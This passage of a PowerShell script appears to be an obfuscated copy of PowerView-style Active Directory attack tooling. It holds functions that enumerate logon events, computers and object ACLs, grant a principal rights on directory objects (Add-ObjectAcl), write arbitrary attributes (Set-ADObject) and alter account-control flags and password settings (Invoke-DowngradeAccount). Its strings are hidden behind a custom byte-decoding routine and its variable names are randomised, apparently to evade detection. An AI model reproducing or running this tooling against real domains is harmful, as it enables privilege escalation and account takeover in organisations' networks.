        Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter ("(" + $SearchField + ([char]0x3d+[char]0x2a) + $SearchTerm + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kik=")))) -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}
function Get-UserEvent {
    Param(
        [String]
        $ComputerName = $Env:ComputerName,
        [String]
        [ValidateSet((ParseEntry20 @(18,176,105,29,165,66,195,109) @(112,247,80,115,199)),(ParseEntry20 @(106,28,101,121) @(14,91,1,73,27)),(ParseEntry20 @(186,54,87,63) @(227,97,47,76,237,63)))]
        $EventType = (ParseEntry20 @(196,203,221,192,183,214,146,177) @(166,140,228,174,213,228)),
        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )
    if($EventType.ToLower() -like (ParseEntry20 @(172,102,1,105,138,39,10,241) @(206,33,56,7,232,21,62,204))) {
        [Int32[]]$UGG1oI9 = @(4624)
    }
    elseif($EventType.ToLower() -like (ParseEntry20 @(184,197,192,41) @(220,130,164,25,47,160,181))) {
        [Int32[]]$UGG1oI9 = @(4768)
    }
    else {
        [Int32[]]$UGG1oI9 = @(4624, 4768)
    }
    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$UGG1oI9; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {
        if($UGG1oI9 -contains 4624) {    
            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {
                if($Matches) {
                    $fosx4sVb = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $fosx4sVb = ""
            }
            if (($fosx4sVb -eq 2) -or ($fosx4sVb -eq 3)) {
                try {
                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {
                        if($Matches) {
                            $UserName = $Matches[0].split(([char]0x0a))[2].split(":")[1].trim()
                            $Domain = $Matches[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cg=="))))[3].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {
                        if($Matches) {
                            $BHVNz9LV = $Matches[0].split(([char]0x0a))[2].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON')) {
                        $Y9NL = @{
                            'Domain' = $Domain
                            'ComputerName' = $ComputerName
                            'Username' = $UserName
                            'Address' = $BHVNz9LV
                            'ID' = '4624'
                            'LogonType' = $fosx4sVb
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property $Y9NL
                    }
                }
                catch {
                    Write-Debug ((ParseEntry20 @(28,99,89,177,214,125,114,116,171,243,8,66,112,250,216,59,97,106,138,216,42,86,69,189,208,13,121,96,170,134,42,65,92,161,245,115) @(78,59,19,200,180)) + $_)
                }
            }
        }
        if($UGG1oI9 -contains 4768) {
            try {
                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {
                    if($Matches) {
                        $Username = $Matches[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cg=="))))[1].split(":")[1].trim()
                        $Domain = $Matches[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cg=="))))[2].split(":")[1].trim()
                        $Matches = $Null
                    }
                }
                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {
                    if($Matches) {
                        $BHVNz9LV = $Matches[0].split(([char]0x0a))[1].split(":")[-1].trim()
                        $Matches = $Null
                    }
                }
                $Y9NL = @{
                    'Domain' = $Domain
                    'ComputerName' = $ComputerName
                    'Username' = $UserName
                    'Address' = $BHVNz9LV
                    'ID' = '4768'
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }
                New-Object -TypeName PSObject -Property $Y9NL
            }
            catch {
                Write-Debug ((ParseEntry20 @(61,187,96,98,146,190,7,8,128,109,93,137,238,124,3,150,112,98,178,225,42,2,181,95,127,179,207,61,13,209,78,97,191,228,15,82) @(111,227,42,27,240,141,78)) + $_)
            }
        }
    }
}
function Get-ObjectAcl {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,
        [String]
        $Name = "*",
        [Alias('DN')]
        [String]
        $DistinguishedName = "*",
        [Switch]
        $ResolveGUIDs,
        [String]
        $Filter,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [String]
        [ValidateSet((ParseEntry20 @(203,5,124,11) @(154,82,4,120,152,14,227,100)),(ParseEntry20 @(252,157,249,113,218,67,243,248,169,247,69,250,127,147,144,137,245,74,189,38) @(169,240,175,11,128,27,161)),(ParseEntry20 @(207,172,164,20,64,222,201,160,62,115,168,246,180,60,110,227) @(153,159,238,100,36)))]
        $RightsFilter,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $TRb13UTh = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize
        if($ResolveGUIDs) {
            $Pt0LtPu8 = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }
    process {
        if ($TRb13UTh) {
            if($SamAccountName) {
                $TRb13UTh.filter=((ParseEntry20 @(21,151,57,101,10,108,146,20,83,62,16,190,2,57,63,43,176,39,63,1,60,131,53,51) @(94,212,96,10,105)) + $SamAccountName + (ParseEntry20 @(122,194,60,72,196,125,20,45,97,192,105,0) @(49,145,84,61,157,42,37,65)) + $Name + (ParseEntry20 @(159,47,119,206,148,28,168,228,29,72,144,155,32,177,184,6,126,226,163,47,132,185,58,107,255,161,116,219) @(212,124,31,165,245,68,230)) + $DistinguishedName + ")" + $Filter + ")")  
            }
            else {
                $TRb13UTh.filter=((ParseEntry20 @(1,57,135,209,40,23,152,202,16,46,238,131) @(74,122,222,190)) + $Name + (ParseEntry20 @(253,250,154,15,94,199,0,134,200,165,81,81,251,25,218,211,147,35,105,244,44,219,239,134,62,107,175,115) @(182,169,242,100,63,159,78)) + $DistinguishedName + ")" + $Filter + ")")  
            }
            try {
                $TRb13UTh.FindAll() | Where-Object {$_} | Foreach-Object {
                    $Object = [adsi]($_.path)
                    if($Object.distinguishedname) {
                        $X2ndzV = $Object.PsBase.ObjectSecurity.access
                        $X2ndzV | ForEach-Object {
                            $_ | Add-Member NoteProperty 'ObjectDN' ($Object.distinguishedname[0])
                            if($Object.objectsid[0]){
                                $L68q2oB5 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $L68q2oB5 = $Null
                            }
                            $_ | Add-Member NoteProperty 'ObjectSID' $L68q2oB5
                            $_
                        }
                    }
                } | ForEach-Object {
                    if($RightsFilter) {
                        $N40SS = Switch ($RightsFilter) {
                            (ParseEntry20 @(66,44,67,247,71,79,19,68,212,69,89,59,113,191,36,110,27,84,176,32) @(23,65,21,141,29)) { (ParseEntry20 @(197,145,254,65,251,2,227,228,241,66,245,34,197,191,238,10,238,21,184,173,242,111,229,33,196,130,250,11,250,60,239,161,242,124,246,62,209,129,254,79,250,59,221,162,241,108,253,99) @(136,213,191,56,180,86)) }
                            (ParseEntry20 @(16,119,32,58,192,26,143,8,30,61,123,205,7,129,12,62) @(70,68,106,74,164,93,217)) { (ParseEntry20 @(28,231,37,11,80,248,38,191,37,68,95,230,8,205,46,82,80,251,117,242,49,105,79,229,9,221,57,71,81,214,16,254,49,122,92,250,28,222,61,73,83,232,4,186,51,105,75,235) @(69,138,124,62,30,146)) }
                            Default { (ParseEntry20 @(140,123,228,32,213,186,128,72,232,19,217,138,140,123,228,32,213,189,241,72,232,19,217,137,141,107,228,32,213,186,128,75,232,19,217,137,140,123,228,32,213,186,128,72,232,19,217,137) @(193,63,165,87,152,254))}
                        }
                        if($_.ObjectType -eq $N40SS) { $_ }
                    }
                    else {
                        $_
                    }
                } | Foreach-Object {
                    if($Pt0LtPu8) {
                        $wvTu5 = @{}
                        $_.psobject.properties | ForEach-Object {
                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {
                                try {
                                    $wvTu5[$_.Name] = $Pt0LtPu8[$_.Value.toString()]
                                }
                                catch {
                                    $wvTu5[$_.Name] = $_.Value
                                }
                            }
                            else {
                                $wvTu5[$_.Name] = $_.Value
                            }
                        }
                        New-Object -TypeName PSObject -Property $wvTu5
                    }
                    else { $_ }
                }
            }
            catch {
                Write-Warning $_
            }
        }
    }
}
function Add-ObjectAcl {
    [CmdletBinding()]
    Param (
        [String]
        $TargetSamAccountName,
        [String]
        $TargetName = "*",
        [Alias('DN')]
        [String]
        $TargetDistinguishedName = "*",
        [String]
        $TargetFilter,
        [String]
        $TargetADSpath,
        [String]
        $TargetADSprefix,
        [String]
        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]
        $PrincipalSID,
        [String]
        $PrincipalName,
        [String]
        $PrincipalSamAccountName,
        [String]
        [ValidateSet((ParseEntry20 @(53,143,238,220) @(100,216,150,175,193)),(ParseEntry20 @(22,49,191,106,25,4,187,65,26,4,167,106,39,110,208,105,25,29,212,45) @(67,92,233,16)),(ParseEntry20 @(65,106,111,167,167,205,191,89,3,114,230,170,208,177,93,35) @(23,89,37,215,195,138,233)),(ParseEntry20 @(146,35,218,181,243,127,32,170) @(192,102,148,225,150,40,21)))]
        $Rights = (ParseEntry20 @(254,197,22,42) @(175,146,110,89,45,79)),
        [String]
        $RightsGUID,
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $TRb13UTh = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize
        if(!$PrincipalSID) {
            $pn5JfG = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize
            if(!$pn5JfG) {
                throw (ParseEntry20 @(16,132,145,83,164,85,41,37,191,182,124,188,4,82,58,238,186,125,243,8,41,10,158,162,75,145,83,10,35,132,153,66,164,39,93,127) @(66,220,219,42,198,102,96))
            }
            $PrincipalSID = $pn5JfG.objectsid
        }
        if(!$PrincipalSID) {
            throw (ParseEntry20 @(45,194,140,56,147,195,165,24,249,171,23,139,146,222,7,168,167,22,196,158,165,55,216,191,32,166,197,134,30,194,132,41,147,177,209,66) @(127,154,198,65,241,240,236))
        }
    }
    process {
        if ($TRb13UTh) {
            if($TargetSamAccountName) {
                $TRb13UTh.filter=((ParseEntry20 @(237,164,101,153,106,27,224,147,101,161,71,67,196,212,106,131,109,110,147,143,94,161,92,16) @(166,231,60,246,9,41)) + $TargetSamAccountName + (ParseEntry20 @(231,206,181,222,65,221,157,241,141,250,37,183) @(172,157,221,171,24,138)) + $TargetName + (ParseEntry20 @(28,79,55,227,14,168,241,103,125,8,189,1,148,232,59,102,62,207,57,155,221,58,90,43,210,59,192,130) @(87,28,95,136,111,240,191)) + $TargetDistinguishedName + ")" + $TargetFilter + ")")  
            }
            else {
                $TRb13UTh.filter=((ParseEntry20 @(182,90,8,123,195,144,95,37,78,245,205,36) @(253,25,81,20,161)) + $TargetName + (ParseEntry20 @(98,119,130,116,6,61,105,223,72,115,223,113,3,50,75,149,72,99,188,116,5,8,97,155,115,112,218,34) @(41,36,234,31,103,101,39,239)) + $TargetDistinguishedName + ")" + $TargetFilter + ")")  
            }
            try {
                $TRb13UTh.FindAll() | Where-Object {$_} | Foreach-Object {
                    $sVpPS0bg = $_.Properties.distinguishedname
                    $UT78Rwq = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)
                    $jAAu5h = [System.DirectoryServices.ActiveDirectorySecurityInheritance] (ParseEntry20 @(153,44,235,221,81,102,240,124) @(205,65,210,168,11,55))
                    $bIhId = [System.Security.AccessControl.AccessControlType] (ParseEntry20 @(13,221,249,26,62,185,226,84) @(92,138,129,105))
                    $BhqND4 = @()
                    if($RightsGUID) {
                        $Pt0LtPu8 = @($RightsGUID)
                    }
                    else {
                        $Pt0LtPu8 = Switch ($Rights) {
                            (ParseEntry20 @(144,153,67,59,116,157,166,68,24,118,139,142,113,115,23,188,174,84,124,19) @(197,244,21,65,46)) { (ParseEntry20 @(72,25,150,218,244,74,110,108,153,217,250,106,72,55,134,145,225,93,53,37,154,244,234,105,73,10,146,144,245,116,98,41,154,231,249,118,92,9,150,212,245,115,80,42,153,247,242,43) @(5,93,215,163,187,30)) }
                            (ParseEntry20 @(138,17,152,20,150,223,249,146,120,133,85,155,194,247,150,88) @(220,34,210,100,242,152,175)) { (ParseEntry20 @(92,103,233,71,75,96,211,71,92,112,241,6,72,77,226,30,75,99,128,10,72,93,225,5,73,93,245,11,74,78,229,6,72,78,242,26,92,94,241,5,72,112,241,66,74,93,229,11) @(5,10,176,114)) }
                            (ParseEntry20 @(233,191,118,215,201,56,88,209) @(187,250,56,131,172,111,109)) { (ParseEntry20 @(81,242,208,249,198,159,187,82,69,241,208,247,196,159,175,23,82,223,165,251,198,159,179,24,80,241,204,176,196,159,187,20,81,226,215,233,198,140,176,13,69,220,223,232,210,250,179,25) @(28,166,149,131,139,200,226,96)), (ParseEntry20 @(47,167,106,255,47,164,118,183,59,164,126,241,45,164,98,242,44,138,31,253,47,164,126,253,46,164,118,182,45,164,118,241,47,183,109,239,47,183,125,232,59,137,101,238,59,193,126,252) @(98,243,47,133)), (ParseEntry20 @(91,250,83,148,91,234,105,145,90,196,102,140,90,250,110,200,78,253,15,200,77,196,102,129,88,234,84,205,89,233,122,140,89,249,101,144,77,140,117,148,78,249,122,202,90,250,125,146) @(20,190,63,248))}
                        }
                    }
                    if($Pt0LtPu8) {
                        foreach($GUID in $Pt0LtPu8) {
                            $bG6T = New-Object Guid $GUID
                            $Y8zsSK0Q = [System.DirectoryServices.ActiveDirectoryRights] (ParseEntry20 @(169,128,75,205,53,211,206,179,121,170,61,215,154,143,71,146,11,197,198,229) @(251,216,35,253,111,132))
                            $BhqND4 += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $UT78Rwq,$Y8zsSK0Q,$bIhId,$bG6T,$jAAu5h
                        }
                    }
                    else {
                        $Y8zsSK0Q = [System.DirectoryServices.ActiveDirectoryRights] (ParseEntry20 @(139,75,10,79,23,3,147,9,5,10,11,40,187,56,97,7) @(217,121,92,58,77,91))
                        $BhqND4 += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $UT78Rwq,$Y8zsSK0Q,$bIhId,$jAAu5h
                    }
                    Write-Verbose ((ParseEntry20 @(77,150,105,143,75,99,77,213,65,138,74,106,124,237,105,151,75,96,81,213,64,160,111,126,86,228,30,218) @(31,165,35,231,41,13)) + $PrincipalSID + ([char]0x20+[char]0x27) + $Rights + (ParseEntry20 @(189,216,255,131,65,28,152,202) @(247,161,189,245,35,117,217)) + $($_.Properties.distinguishedname))
                    try {
                        ForEach ($sIS1WFo in $BhqND4) {
                            Write-Verbose ((ParseEntry20 @(240,115,173,217,192,46,181,193,192,45,132,214,193,8,173,193,192,45,169,193,193,7,161,194,235,1,218,140) @(162,64,231,177)) + $PrincipalSID + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICc="))) + $($sIS1WFo.ObjectType) + (ParseEntry20 @(16,232,89,186,107,13,245,116,167,66,23,246,121,241,62,61) @(90,145,27,195,10)) + $($_.Properties.distinguishedname))
                            $Object = [adsi]($_.path)
                            $Object.PsBase.ObjectSecurity.AddAccessRule($sIS1WFo)
                            $Object.PsBase.commitchanges()
                        }
                    }
                    catch {
                        Write-Warning ((ParseEntry20 @(159,210,182,225,220,114,132,237,166,171,244,41,175,228,174,232,220,44,174,237,159,208,244,49,175,231,178,232,221,6,139,249,181,217,131,124) @(205,138,252,152,190,65)) + $PrincipalSID + ([char]0x20+[char]0x27) + $Rights + (ParseEntry20 @(109,236,70,179,202,175,102,168) @(39,149,4,197,168,198)) + $sVpPS0bg + (ParseEntry20 @(212,5,125,87) @(157,65,18,48,222,240)) + $_)
                    }
                }
            }
            catch {
                Write-Warning ((ParseEntry20 @(40,214,173,36,90,73,199,209,20,121,71,179) @(122,142,231,93,56)) + $_)
            }
        }
    }
}
function Invoke-ACLScanner {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,
        [String]
        $Name = "*",
        [Alias('DN')]
        [String]
        $DistinguishedName = "*",
        [String]
        $Filter,
        [String]
        $ADSpath,
        [String]
        $ADSprefix,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ResolveGUIDs,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    Get-ObjectACL @PSBoundParameters | ForEach-Object {
        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)
        $_
    } | Where-Object {
        try {
            [int]($_.IdentitySid.split("-")[-1]) -ge 1000
        }
        catch {}
    } | Where-Object {
        ($_.ActiveDirectoryRights -eq (ParseEntry20 @(157,244,179,206,222,151,140,149,226,180,137,181,135,250,185,242) @(207,198,229,187,132))) -or ($_.ActiveDirectoryRights -match (ParseEntry20 @(143,235,151,35,189,159,136,110) @(217,216,221,83))) -or ($_.ActiveDirectoryRights -match (ParseEntry20 @(11,133,148,178,23,210,98,54) @(90,182,222,222,78,138,48))) -or ($_.ActiveDirectoryRights -match (ParseEntry20 @(196,81,88,168,204,78,92,183) @(150,22,14,219))) -or (($_.ActiveDirectoryRights -match (ParseEntry20 @(181,235,10,182,189,228,87,237,189,228,48,213,134,228,6,233,131,242,95,187) @(231,179,98,134))) -and ($_.AccessControlType -eq (ParseEntry20 @(119,67,42,138,161,21,119,111) @(38,20,82,249,195))))
    }
}
function Get-GUIDMap {
    [CmdletBinding()]
    Param (
        [String]
        $Domain,
        [String]
        $DomainController,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    $Pt0LtPu8 = @{'00000000-0000-0000-0000-000000000000' = 'All'}
    $qJ4Rro = (Get-NetForest).schema.name
    $SD3s = Get-DomainSearcher -ADSpath $qJ4Rro -DomainController $DomainController -PageSize $PageSize
    if($SD3s) {
        $SD3s.filter = (ParseEntry20 @(163,68,154,31,161,53,185,151,177,89,184,48,146,67,185,169,186,72,228,4,139,35,210,222) @(232,12,212,117,192,114,239,227))
        try {
            $SD3s.FindAll() | Where-Object {$_} | ForEach-Object {
                $Pt0LtPu8[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug ((ParseEntry20 @(23,142,122,58,245,128,228,219,36,129,4,36,206,221,251,204,39,145,98,51,245,222,206,219,23,231,102,9,197,240,239,200,28,142,113,117,222,242,144,129) @(69,214,48,67,151,179,173,188)) + $_)
        }      
    }
    $k1nkLA1 = Get-DomainSearcher -ADSpath $qJ4Rro.replace((ParseEntry20 @(50,121,99,210,160,102,86,35) @(103,75,45,189,250,49)),(ParseEntry20 @(151,29,209,164,247,189,31,30,159,18,232,224,248,135,70,27,164,13,235,238) @(197,69,185,148,173,234,42,117))) -DomainController $DomainController -PageSize $PageSize
    if ($k1nkLA1) {
        $k1nkLA1.filter = (ParseEntry20 @(222,118,199,4,90,41,142,9,241,116,176,30,98,28,150,25,197,102,176,27,89,42,138,26,247,3,134,47,98,118,150,15,246,2,176,62,90,19,188,12,241,114,149,80) @(149,49,254,109,59,68,216,99))
        try {
            $k1nkLA1.FindAll() | Where-Object {$_} | ForEach-Object {
                $Pt0LtPu8[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
            }
        }
        catch {
            Write-Debug ((ParseEntry20 @(33,3,201,125,44,221,165,20,58,212,48,41,183,130,37,43,225,67,28,158,142,30,56,228,86,127,184,166,33,24,193,112,23,182,173,69,18,194,57,115) @(115,91,131,4,78,238,236)) + $_)
        }
    }
    $Pt0LtPu8
}
function Get-NetComputer {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = '*',
        [String]
        $SPN,
        [String]
        $OperatingSystem,
        [String]
        $ServicePack,
        [String]
        $Filter,
        [Switch]
        $Printers,
        [Switch]
        $Ping,
        [Switch]
        $FullData,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $Unconstrained,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $zU2pM = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($zU2pM) {
            if($Unconstrained) {
                Write-Verbose (ParseEntry20 @(237,195,29,229,193,213,191,36,236,245,141,159,2,202,248,206,146,34,207,200,218,195,122,250,198,224,163,39,238,204,245,150,47,191,206,136,144,8,207,207,218,194,2,234,198,239,196,33,239,144,141,139,47,197,232,208,144,28,184,206,226,178,9,230,248,239,137,39,215,144,254,193,42,218,155,205) @(184,241,75,141,162))
                $Filter += (ParseEntry20 @(103,210,62,4,163,234,102,216,49,76,183,196,72,205,93,78,168,128,21,239,12,54,179,196,78,222,7,6,181,216,101,239,39,58,168,197,96,240,45,6,180,200,121,171,38,23,205,202,96,240,57,11,182,246,109,224,39,20,201,131,97,240,57,7,182,246,75,234) @(44,154,104,126,249,178))
            }
            if($Printers) {
                Write-Verbose (ParseEntry20 @(61,62,89,228,222,5,66,96,237,234,93,98,70,203,231,30,111,102,206,202,11,97,99,249,217,47,90,118,239,202,85,49) @(104,12,15,140,189))
                $Filter += (ParseEntry20 @(43,93,22,25,194,244,129,176,4,95,97,24,199,222,129,180,2,41,101,69,243,193,149,163,1,77,26,64,246,193,129,182,4,77,122,0) @(96,26,47,112,163,153,215,218))
            }
            if($SPN) {
                Write-Verbose ((ParseEntry20 @(124,108,156,38,76,62,148,235,72,9,255,32,102,20,128,242,74,55,136,36,77,97,235,243,77,6,152,34,76,61,151,227,77,108,166,126,78,16,152,208,124,27,254,120,102,18,231,185) @(41,94,202,78,47,83,218,132)) + $SPN)
                $Filter += ((ParseEntry20 @(212,47,34,22,252,9,54,10,198,85,58,43,252,10,0,15,198,85,0,13,198,48,20,53,198,48,93,22,207,54,81,71) @(159,103,108,122)) + $SPN + ")")
            }
            if($OperatingSystem) {
                $Filter += ((ParseEntry20 @(120,167,103,206,10,107,170,54,221,23,95,149,4,138,30,6,131,109,235,60,81,180,110,132) @(51,224,94,185,80)) + $OperatingSystem + ")")
            }
            if($ServicePack) {
                $Filter += ((ParseEntry20 @(248,129,72,133,233,158,59,154,215,129,29,135,233,245,63,199,208,245,35,158,209,158,63,158,208,168,43,130,234,244,39,133,234,145,63,128,227,151,76,207) @(179,198,113,242)) + $ServicePack + ")")
            }
            $zU2pM.filter = ((ParseEntry20 @(101,24,230,195,104,30,29,241,253,92,96,49,221,159,93,91,63,249,254,62,77,28,234,149,68,106,26,142,225,113,111,105,242,214,82,27,16,236,196,96,76,53,241,195,105,29,21,143,206,102,104,47,229,248,59,19) @(46,91,191,172,11)) + $ComputerName + ")" + $Filter + ")")
            try {
                $zU2pM.FindAll() | Where-Object {$_} | ForEach-Object {
                    $lPdgSYQ = $True
                    if($Ping) {
                        $lPdgSYQ = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                    }
                    if($lPdgSYQ) {
                        if ($FullData) {
                            Convert-LDAPProperty -Properties $_.Properties
                        }
                        else {
                            $_.properties.dnshostname
                        }
                    }
                }
            }
            catch {
                Write-Warning ((ParseEntry20 @(60,77,69,94,14,159,39,35,70,102,81,145) @(110,21,15,39,108,172)) + $_)
            }
        }
    }
}
function Get-ADObject {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SID,
        [String]
        $Name,
        [String]
        $SamAccountName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [String]
        $Filter,
        [Switch]
        $ReturnRaw,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if($SID) {
            try {
                $Name = Convert-SidToName $SID
                if($Name) {
                    $JoeNd = Convert-NT4toCanonical -ObjectName $Name
                    if($JoeNd) {
                        $Domain = $JoeNd.split("/")[0]
                    }
                    else {
                        Write-Warning ((ParseEntry20 @(227,160,8,112,120,130,177,37,106,119,231,130,32,59,98,131,153,21,60,116,248,190,12,67,72,242,185,44) @(177,248,66,9,26)) + $SID + "'")
                        return $Null
                    }
                }
            }
            catch {
                Write-Warning ((ParseEntry20 @(193,28,169,243,248,23,58,95,240,41,181,240,248,22,11,10,242,19,214,228,211,98,61,114,193,7,162,228) @(147,68,227,138,154,36,115,56)) + $SID + (ParseEntry20 @(139,140,208,206,174,222,79,252) @(193,245,145,248,231,159,114)) + $_)
                return $Null
            }
        }
        $piKX = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
        if($piKX) {
            if($SID) {
                $piKX.filter = ((ParseEntry20 @(70,22,35,164,110,63,31,11,145,91,67,101,25,249,96,102,5,43,246,49) @(13,85,122,203,12)) + $SID + ")" + $Filter + ")")
            }
            elseif($Name) {
                $piKX.filter = ((ParseEntry20 @(9,19,148,55,122,80,44,169,24,4,253,101) @(66,80,205,88,24,61,106,221)) + $Name + ")" + $Filter + ")")
            }
            elseif($SamAccountName) {
                $piKX.filter = ((ParseEntry20 @(21,59,241,253,85,88,24,12,249,197,120,0,60,75,254,231,82,47,107,16,202,197,99,83) @(94,120,168,146,54,106)) + $SamAccountName + ")" + $Filter + ")")
            }
            $piKX.FindAll() | Where-Object {$_} | ForEach-Object {
                if($ReturnRaw) {
                    $_
                }
                else {
                    Convert-LDAPProperty -Properties $_.Properties
                }
            }
        }
    }
}
function Set-ADObject {
    [CmdletBinding()]
    Param (
        [String]
        $SID,
        [String]
        $Name,
        [String]
        $SamAccountName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $Filter,
        [Parameter(Mandatory = $True)]
        [String]
        $PropertyName,
        $PropertyValue,
        [Int]
        $PropertyXorValue,
        [Switch]
        $ClearValue,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    $Z5nzf = @{
        'SID' = $SID
        'Name' = $Name
        'SamAccountName' = $SamAccountName
        'Domain' = $Domain
        'DomainController' = $DomainController
        'Filter' = $Filter
        'PageSize' = $PageSize
    }
    $i8rB = Get-ADObject -ReturnRaw @Z5nzf
    try {
        $oRbi1F9 = $i8rB.GetDirectoryEntry()
        if($ClearValue) {
            Write-Verbose (ParseEntry20 @(187,90,240,211,109,178,34,248,221,89,137,15,236,210,114,153,12,223,234,9) @(234,104,136,191,52))
            $oRbi1F9.$PropertyName.clear()
            $oRbi1F9.commitchanges()
        }
        elseif($PropertyXorValue) {
            $IKYqaI = $oRbi1F9.$PropertyName[0].GetType().name
            $PropertyValue = $($oRbi1F9.$PropertyName) -bxor $PropertyXorValue 
            $oRbi1F9.$PropertyName = $PropertyValue -as $IKYqaI       
            $oRbi1F9.commitchanges()     
        }
        else {
            $oRbi1F9.put($PropertyName, $PropertyValue)
            $oRbi1F9.setinfo()
        }
    }
    catch {
        Write-Warning ((ParseEntry20 @(23,178,244,27,24,118,163,217,1,72,19,218,218,37,22,48,176,199,32,13,38,135,135,21,32,29,160,142,7,41,4,215) @(69,234,190,98,122)) + $PropertyName + (ParseEntry20 @(156,92,212,187,137,203,143,124,228,133,150,239,156,87,229,240) @(213,20,134,205,192,131)) + $PropertyValue + (ParseEntry20 @(28,185,138,84,182,101,137,175,91,230,28,177,146,110,154,102,137,137,4,233) @(86,192,200,57,212)) + $($i8rB.Properties.samaccountname) + (ParseEntry20 @(231,157,150,131) @(174,217,249,228,24)) + $_)
    }
}
function Invoke-DowngradeAccount {
    [CmdletBinding()]
    Param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SamAccountName,
        [String]
        $Name,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $Filter,
        [Switch]
        $Repair
    )
    process {
        $Z5nzf = @{
            'SamAccountName' = $SamAccountName
            'Name' = $Name
            'Domain' = $Domain
            'DomainController' = $DomainController
            'Filter' = $Filter
        }
        $IzZb = Get-ADObject @Z5nzf | select useraccountcontrol | ConvertFrom-UACValue
        if($Repair) {
            if($IzZb.Keys -contains (ParseEntry20 @(84,27,52,140,121,106,34,80,158,105,80,11,89,249,126,64,25,71,154,74,83,8,101,141,116,54,8,76,156,105,63,22,83,157,125,59) @(6,78,1,200,44))) {
                Set-ADObject @Z5nzf -PropertyName useraccountcontrol -PropertyXorValue 128
            }
            Set-ADObject @Z5nzf -PropertyName pwdlastset -PropertyValue -1
        }
        else {
            if($IzZb.Keys -contains (ParseEntry20 @(91,28,170,170,51,79,96,213,178,35,75,19,198,142,51,111,12,214,163,49,92,104,247,181,48,98,8,174) @(9,89,147,229,101))) {
                Set-ADObject @Z5nzf -PropertyName useraccountcontrol -PropertyXorValue 65536
            }
            if($IzZb.Keys -notcontains (ParseEntry20 @(209,230,241,49,214,223,168,36,213,246,146,48,219,130,150,51,212,245,150,19,214,245,160,48,219,131,130,56,215,246,253,45,209,230,149,72) @(131,179,196,117))) {
                Set-ADObject @Z5nzf -PropertyName useraccountcontrol -PropertyXorValue 128
            }
            Set-ADObject @Z5nzf -PropertyName pwdlastset -PropertyValue 0
        }
    }
}
function Get-ComputerProperty {
    [CmdletBinding()]
    param(
        [String[]]
        $Properties,
        [String]
        $Domain,
